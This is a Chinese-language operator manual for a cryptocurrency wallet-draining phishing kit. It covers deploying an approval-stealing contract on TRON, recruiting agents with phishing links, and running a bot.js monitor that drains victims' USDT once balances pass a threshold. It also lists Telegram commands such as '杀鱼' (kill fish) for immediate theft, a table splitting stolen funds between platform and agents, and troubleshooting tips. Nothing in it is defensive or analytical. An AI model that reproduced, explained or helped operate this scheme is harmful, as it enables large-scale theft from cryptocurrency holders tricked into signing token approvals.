# 使用方式

## 整体工作流程

<div class="shadcn-steps">

<div class="shadcn-step">
  <div class="shadcn-step-number">1</div>
  <div class="shadcn-step-content">
    <strong>部署合约</strong>
    <p>使用 TronLink 或 TronIDE 将 <code>heyue.sol</code> 部署到 TRON 主网，记录合约地址。</p>
    <div class="shadcn-code-block">

```solidity
// 部署后调用 transferOwnership 确保控制权
heyue.transferOwnership(your_address)
```

    </div>
  </div>
</div>

<div class="shadcn-step">
  <div class="shadcn-step-number">2</div>
  <div class="shadcn-step-content">
    <strong>配置后台</strong>
    <p>将合约地址填入「TRC权限地址」，部署者私钥填入「TRC权限私钥」。</p>
  </div>
</div>

<div class="shadcn-step">
  <div class="shadcn-step-number">3</div>
  <div class="shadcn-step-content">
    <strong>创建代理</strong>
    <p>在「渔夫管理」中添加代理，生成 9 位 unique_id 链接。</p>
    <div class="shadcn-code-block">

```bash
# 代理链接格式
https://your-domain.com/buy/1?id=trc123456789
```

    </div>
  </div>
</div>

<div class="shadcn-step">
  <div class="shadcn-step-number">4</div>
  <div class="shadcn-step-content">
    <strong>启动机器人</strong>
    <p>运行 bot.js 启动链上监控和 Telegram 机器人。</p>
  </div>
</div>

<div class="shadcn-step">
  <div class="shadcn-step-number">5</div>
  <div class="shadcn-step-content">
    <strong>用户授权</strong>
    <p>用户通过代理链接访问钓鱼页面 → approve 合约地址 → 钱包被系统接管。</p>
  </div>
</div>

</div>

---

## Telegram 机器人命令

<div class="shadcn-table-wrapper">

| 命令 | 格式 | 说明 |
|------|------|------|
| 上课 | `上课` | 在群内启用机器人 |
| 下课 | `下课` | 在群内停用机器人 |
| 鱼池 | `鱼池` / `鱼苗` / `我的` | 查看自己名下的鱼苗列表 |
| 杀鱼 | `杀鱼 <地址>` | 立即触发转账（阈值降至 0.000001） |
| 阈值 | `阈值 <地址> <金额>` | 设置某鱼苗的触发阈值 |
| 自动阈值 | `自动阈值 <金额>` | 设置新授权鱼苗的默认阈值 |
| 收款地址 | `收款地址 <地址>` | 绑定代理收款地址 |
| 收款地址 | `收款地址` | 查询当前绑定的收款地址 |
| 代理 | `代理` / `代理链接` / `商城` | 生成代理专属链接 |
| 查看鱼苗 | `查看鱼苗 @username` | 管理员查看其他代理的鱼苗 |
| 收款 | `收款 <金额>` | 生成收款请求 |

</div>

---

## 轮询监控流程

```
bot.js 每 3 秒轮询：

1. 拉取最新区块 → 扫描 TriggerSmartContract 交易
2. 检测 approve 事件 → 匹配 permission_address
3. 新地址 → 写入 fish 表 (auth_status=1)
4. 已有地址 → 更新余额
5. 检查余额 > 阈值 → 触发转账
6. 调用合约 controlAndTransferToken → 分润拆分
```

---

## 分润详解

<div class="shadcn-card">
  <div class="shadcn-card-header">
    <span>TRC 链分润</span>
  </div>
  <div class="shadcn-card-body">

| 分润比例 | 平台 | 代理 |
|----------|------|------|
| 0.00 | 100% | 0% |
| 0.30 | 70% | 30% |
| 0.50 | 50% | 50% |
| 0.80 | 20% | 80% |
| 1.00 | 0% | 100% |

  </div>
</div>

<div class="shadcn-card shadcn-card-warning" style="margin-top: 12px;">
  <div class="shadcn-card-body">
    ⚠️ 代理必须先绑定「收款地址」，否则分润归平台所有。EVM 链暂不支持自动分润，100% 归平台。
  </div>
</div>

---

## 鱼苗生命周期

<div class="shadcn-code-block">

```
[授权] → auth_status=1, usdt_balance=X
   ↓
[监控] → 每 3 秒更新余额
   ↓
[触发] → usdt_balance > threshold
   ↓
[转账] → 合约 transferFrom → 分润
   ↓
[重置] → threshold=200, 等待下次充值触发
```

</div>

---

## 常见问题

<div class="shadcn-card">
  <div class="shadcn-card-header">
    <strong>Q: 鱼苗不触发转账？</strong>
  </div>
  <div class="shadcn-card-body">
    检查：1) TRX 余额是否 > 50（矿工费） 2) 阈值是否设置正确 3) TronGrid API Key 是否充足。
  </div>
</div>

<div class="shadcn-card" style="margin-top: 8px;">
  <div class="shadcn-card-header">
    <strong>Q: 如何修改分润比例？</strong>
  </div>
  <div class="shadcn-card-body">
    后台「总代管理」→ 编辑群组 → 修改 share_profits 字段。
  </div>
</div>

<div class="shadcn-card" style="margin-top: 8px;">
  <div class="shadcn-card-header">
    <strong>Q: 如何添加多条链？</strong>
  </div>
  <div class="shadcn-card-body">
    bot.js 自动初始化六条链，只需在 options 中配置对应的私钥和收款地址。TRC 是主链，EVM 链可选。
  </div>
</div>
